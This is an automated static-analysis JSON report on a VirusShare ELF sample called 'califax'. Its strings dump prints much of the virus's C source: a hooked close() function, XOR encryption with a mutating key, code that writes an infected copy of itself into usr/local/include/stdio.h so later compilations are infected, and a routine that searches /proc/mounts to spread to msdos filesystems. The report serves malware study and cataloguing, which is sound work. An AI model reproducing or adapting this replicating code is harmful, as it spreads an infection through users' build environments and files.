{
    "docinfo": {},
    "filename": "VirusShare_fc50ff6090d7187b70108a41caae67e9",
    "filesize": 19907,
    "filetype": "ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.0.0, not stripped",
    "hashes": {
        "md5": "fc50ff6090d7187b70108a41caae67e9",
        "sha1": "ab88d5534888a010265af1b0f5e945678a87ea60",
        "sha256": "b527bb3c00b0eed05d9aaaf8a37826ee3f453817993bef126bfdda4b89047c2a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "strcpy",
            "printf",
            "fdopen",
            "fscanf",
            "perror",
            "fprintf",
            "__deregister_frame_info",
            "chdir",
            "umask",
            "read",
            "unlink",
            "fclose",
            "__errno_location",
            "fopen",
            "_IO_stdin_used",
            "__libc_start_main",
            "open",
            "mkdir",
            "__register_frame_info",
            "close",
            "GLIBC_2.1",
            "GLIBC_2.0",
            "1^PTRhh",
            "QVh ",
            "\u0340}\t\u0609",
            "WVS1",
            "jBh\u078b",
            "Vjho",
            "+UUe",
            ")U;]u",
            "+UUe",
            ")U;]u",
            "VA h",
            "VEP h",
            "1e[^_",
            "WVS}",
            "119}(M",
            "$])AF9|1e[^_",
            "UWVS}",
            ">PS,S",
            "~1e[^_",
            "UtWVS]\u03091",
            "t2}1",
            "fSMQ",
            "MQ`1e[^_",
            "\u0403;u]",
            "usr/local",
            "usr/local/include",
            "usr/local/include/stdio.h",
            "fopen",
            "char B[] = ",
            "\\x%02x",
            "char C[] = ",
            "unsigned char key[4] = {0x%02x, 0x%02x, 0x%02x, 0x%02x};",
            "/dev/random",
            "open",
            "/proc/mounts",
            "msdos",
            "started califax. For Doreen.",
            "#include \"/usr/include/stdio.h\"",
            "#include <fcntl.h>",
            "#ifdef linux",
            "#\tinclude <linux/unistd.h>",
            "#else",
            "#\tinclude <dos.h>",
            "#endif",
            "#include <sys/stat.h>",
            "#include <errno.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "int virfunc(void);",
            "int Close(int);",
            "int Crypt(char*, int);",
            "int mutate(char *);",
            "#ifdef linux",
            "  int jump2dos(void);",
            "#endif",
            "#define CHARS 4885",
            "#define CHARS2 367",
            "/* the hooked close-function */",
            "int close(int fd) ",
            "   \tstatic int first = 0;",
            "        if (!first) {",
            "           \tfirst++;",
            "           \tchdir(\"/\");",
            "                virfunc();",
            "#ifdef linux",
            "                jump2dos();",
            "#endif",
            "        }",
            "        return Close(fd);",
            "/* the real close-functions, using the syscalls */",
            "#ifdef linux",
            "int Close(int i)",
            "   \tlong __res;",
            "    \terrno = 0;       ",
            "        __asm__ volatile (\"int $0x80\"",
            "                \t: \"=a\" (__res)",
            "                        : \"0\" (__NR_close),\"b\" ((long)(i)));",
            "                        if (__res >= 0)",
            "                           \treturn (int)__res;",
            "                        errno = -__res;",
            "                        return -1;",
            "#else",
            "int Close(int i) ",
            "   \tunion REGS ir, or;",
            "        ",
            "        errno = 0;",
            "        ir.h.ah = 0x3e;",
            "        ir.x.bx = i;",
            "        memset(&or, 0, sizeof(or));",
            "        int86(0x21, &ir, &or);",
            "        if (or.x.cflag) {",
            "           \terrno = or.x.ax;",
            "                return -1;",
            "        }",
            "        return 0;",
            "#endif",
            "int virfunc(void)",
            "   \tFILE *fd;",
            "        int i = 0, j = 1;",
            "        ",
            "#ifdef linux        ",
            "        int oldmask = umask(0);",
            "#endif",
            "        /* decrypt the arrays first [we assume that it is encrypted !!!]",
            "         * look at the end of virfunc() too",
            "         */",
            "        Crypt(B, CHARS2);",
            "        Crypt(C, CHARS);",
            "        /* get a different key for new encryption */",
            "        mutate(key);",
            "        /* open a file stdio.h in /usr/local/include */",
            "        mkdir(\"usr/local\", 0755);",
            "        mkdir(\"usr/local/include\", 0755);",
            "        unlink(\"usr/local/include/stdio.h\");",
            "        if ((fd = fdopen(open(\"usr/local/include/stdio.h\", O_CREAT|O_RDWR, 0644), \"w+\")) == NULL)",
            "           \tperror(\"fopen\");",
            "        /* write head in it (now plain) */",
            "        fprintf(fd, \"%s\", B);",
            "        /* encrypt array B with new key*/",
            "        Crypt(B, CHARS2);",
            "        /* and write it encrypted to the file */",
            "        fprintf(fd, \"char B[] = \\n\\\"\");",
            "        for (i = 0; i < CHARS2; i++) {",
            "           \tif ((j % 15) == 0) {",
            "                   \tfprintf(fd, \"\\\"\\n\\\"\");",
            "                        j = 0;",
            "                }",
            "                fprintf(fd, \"\\\\x%02x\", (unsigned char)B[i]);",
            "                j++;",
            "        }",
            "        fprintf(fd, \"\\\";\\n\\n\");",
            "        /* encrypt C with the new key */",
            "        fprintf(fd, \"char C[] = \\n\\\"\");",
            "        Crypt(C, CHARS);",
            "        /* and write it to also the file */",
            "        for (i = 0; i < CHARS; i++) {",
            "           \tif ((j % 15) == 0) {",
            "                   \tfprintf(fd, \"\\\"\\n\\\"\");",
            "                        j = 0;",
            "                }",
            "           \tfprintf(fd, \"\\\\x%02x\", (unsigned char)C[i]);",
            "                j++;",
            "        }",
            "        fprintf(fd, \"\\\";\\n\\n\");",
            "        /* put the new key we got to the file wich is used",
            "         * for the next decryption at the next call",
            "         */ ",
            "        fprintf(fd, \"\\n\\nunsigned char key[4] = {0x%02x, 0x%02x, 0x%02x, 0x%02x};\\n\\n\", ",
            "                     (unsigned char)key[0], (unsigned char)key[1], ",
            "                     (unsigned char)key[2], (unsigned char)key[3]);",
            "        /* get C plain */",
            "        Crypt(C, CHARS);",
            "        /* and append it to stdio.h */",
            "        fprintf(fd, \"%s\", C);",
            "        fclose(fd);",
            "#ifdef linux",
            "        umask(oldmask);",
            "#endif",
            "        Crypt(C, CHARS);",
            "        /* result: B and C is encrypted now -> we can call virfunc() again */",
            "        return 0;",
            "/* simple XOR-encryption technique using the global key[] for",
            " * it",
            "int Crypt(char *s, int len)",
            "   \tint i = 0, j = 0;",
            "        ",
            "        for (i = 0; i < len; i++) {",
            "           \ts[i] ^= key[j];",
            "                j = (j + 1) % 4;",
            "        }",
            "        return 0;",
            "/* on linux we use /dev/random, on DOS we use rnd() */",
            "int mutate(char *s)",
            "   \tint i;",
            "#ifdef linux",
            "        int fd;",
            "#endif   ",
            "#ifdef MSDOS",
            "        random();",
            "#endif        ",
            "        for (i = 0; i < 4; i++) {",
            "#ifdef linux",
            "           \tif ((fd = open(\"/dev/random\", O_RDONLY)) <= 0) {",
            "                   \tperror(\"open\");",
            "                        return errno;",
            "                }",
            "                read(fd, &s[i], 1);",
            "                Close(fd);",
            "#else",
            "                s[i] = rand() % 255;",
            "#endif",
            "        }",
            "        return 0;",
            "#ifdef linux",
            "/* look up /proc/mounts to find the mounted msdos fs",
            " * if one was found, call virfunc on it */",
            "int jump2dos(void)",
            "      \tFILE *fd;",
            "        char buf[50] = {0}, bufbak[50] = {0};",
            "        ",
            "        if ((fd = fopen(\"/proc/mounts\", \"r\")) == NULL) {",
            "           \tperror(\"fopen\");",
            "                return errno;",
            "        }",
            "        while (fscanf(fd, \"%s\", buf) > 0) {",
            "                if (strcmp(buf, \"msdos\") == 0)",
            "                   \tbreak;",
            "                memset(bufbak, 0, 50);",
            "                strcpy(bufbak, buf);",
            "        }",
            "        fclose(fd);",
            "        if (strcmp(buf, \"msdos\") == 0) {",
            "           \tchdir((const char*)bufbak);",
            "                virfunc();        ",
            "        }",
            "        return 0;",
            "#endif        ",
            "        ",
            "/** This virus was compiled and started by root@wl2000",
            " ** on Mon May  8 13:13:33 CEST 2000",
            " **/",
            "init.c",
            "/tmp/glibc-2.1.2/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "../config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i386-slackware-linux/egcs-2.91.66/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;\\",
            "grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;\\",
            "currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;\\",
            "mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;\\",
            "positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;\\",
            "int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;\\",
            "p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;\\",
            "n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;\\",
            "p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;\\",
            "__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;\\",
            "__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;\\",
            "__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;\\",
            "__inheritsched:(0,1),96,32;__scope:(0,1),128,32;\\",
            "__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;\\",
            "__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;\\",
            "__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;\\",
            "__m_count:(0,1),32,32;__m_owner:(17,2),64,32;\\",
            "__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;\\",
            "__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;\\",
            "__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;\\",
            "__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;\\",
            "__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "GCC: (GNU) egcs-2.91.66 19990314/Linux (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.3",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.8",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "califax.c",
            "first.58",
            "mkdir@@GLIBC_2.0",
            "fdopen@@GLIBC_2.1",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "umask@@GLIBC_2.0",
            "unlink@@GLIBC_2.0",
            "jump2dos",
            "__errno_location@@GLIBC_2.0",
            "mutate",
            "_init",
            "fscanf@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "virfunc",
            "Close",
            "_start",
            "chdir@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "Crypt",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "fclose@@GLIBC_2.1",
            "open@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "fopen@@GLIBC_2.1",
            "_IO_stdin_used",
            "__data_start",
            "read@@GLIBC_2.0",
            "close",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.302488",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "maldoc_getEIP_method_1"
        }
    ]
}
